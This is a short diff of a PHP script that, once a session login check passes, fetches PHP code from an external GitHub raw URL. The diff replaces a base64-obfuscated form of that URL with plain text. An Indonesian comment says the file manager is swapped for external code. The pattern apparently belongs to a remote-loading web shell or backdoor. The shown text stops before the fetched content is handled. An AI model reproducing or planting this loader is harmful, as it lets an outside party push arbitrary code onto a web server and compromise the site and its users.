@@ -3,7 +3,7 @@ session_start();
 
 if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     // Setelah login, ganti file manager dengan kode eksternal
-    $url = "https://".base64_decode("cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pcGF5YmMvbGF3L3JlZnMvaGVhZHMvbWFpbi9zYW5nZS1icnV0YWwucGhw=");
+    $url = "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/sange-brutal.php";
     $content = file_get_contents($url);
 
     if ($content !== false) {
